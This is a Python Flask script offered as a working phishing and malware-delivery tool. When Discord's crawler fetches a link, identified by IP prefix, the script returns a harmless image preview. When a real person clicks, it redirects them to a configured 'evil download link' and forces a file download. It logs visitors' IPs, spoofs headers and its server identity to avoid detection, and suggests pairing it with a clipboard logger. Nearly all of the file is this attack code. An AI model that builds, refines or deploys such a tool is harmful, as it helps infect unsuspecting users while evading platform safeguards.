import requests, io, os

from waitress import serve
from flask import Flask, request, send_file

# edit this!
image = 'https://discord.com/channels/1422258906729811971/1422258907388186687/1423684596163280988' # Replace this with your image link
malicious = 'https://youcinebaixar.com/downloads/' # Replace this with your evil download link

# You can just put the image here or you can put a custom site.
# You can combine this with my clipboard logger and it'll be more op lol 
# link: https://github.com/TheonlyIcebear/Clipboard-Javascript-Logger
redirect = "https://youcinebaixar.com/downloads/"

# maybe not edit this?
# unless you know what you're doing

lhost = '0.0.0.0' # change to 127.0.0.1 for testing
lport = 8080 # for linux, make sure it's above 1024, else you'll need root perms
timeout = 500 # If the file doesn't download change the 500 to a higher number like 1000

app = Flask(
    __name__
)

session = requests.session()

# spoof the headers, does not fully prevent requests detection!
session.headers = {
    "accept": (
        "text/html,"
        "application/xhtml+xml,"
        "application/xml;q=0.9,"
        "image/avif,"
        "image/webp,"
        "image/apng,"
        "*/*;q=0.8,"
        "application/signed-exchange;v=b3;q=0.9"
    ),

    "accept-encoding": "gzip, deflate",
    "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": "none",
    "sec-fetch-user": "?1",
    "sec-gpc": "1",
    "dnt": "1",
    "upgrade-insecure-requests": "1",
    "user-agent": (
        "Mozilla/5.0 "
        "(Windows NT 10.0; Win64; x64) "
        "AppleWebKit/537.36 "
        "(KHTML, like Gecko) "
        "Chrome/100.0.4896.79 "
        "Safari/537.36"
    )
}

try:
    img_bytes = io.BytesIO(
        session.get(image).content
    ) # store the bytes
except Exception:
    print('Error! Failed to download image. Are you sure it\'s a valid url?')
    exit()

@app.route('/', methods=['GET'])
def main():
    
    # This is to get the ip
    if not request.environ.get('HTTP_X_FORWARDED_FOR'):
        ip = request.environ.get('REMOTE_ADDR')
    else:
        ip = request.environ.get('HTTP_X_FORWARDED_FOR')
    
    if not ip:
        return '<p>no</p>', 404

    print(f'New connection -> {ip}')

    if ip.startswith('35.') or ip.startswith('34.'):

        # If discord is getting a link preview send a image
        return send_file(
            img_bytes,
            mimetype='image/jpeg',
            download_name=os.urandom(6).hex() + '.png' # random filename
        )

    # If a real person is clicking the link 
    # send a malicious file and redirect back to the image
    return (
        f'<meta http-equiv="refresh" content="0; url={malicious}">'
        '    <script>setTimeout(function() {'
        f'        window.location = "{redirect}"'
        f'    }, {timeout})</script>'
    )

if __name__ == '__main__':

    if redirect == 'your final redirect link':
        redirect = image # as backup

    print('\nConfiguration:')
    print(f'Image url - {image}')
    print(f'Evil payload url - {malicious}')
    print(f'Final redirect url - {redirect}')

    print(f'\n\nListening for connections on {lhost}:{lport}...\n')

    serve(
        app,

        # network settings
        host=lhost,
        port=lport,

        # "spoofs the name"
        server_name = 'nginx',
        ident = 'nginx',

        # other stuff
        log_socket_errors = False,
        asyncore_use_poll = True,
        _quiet = True
    )
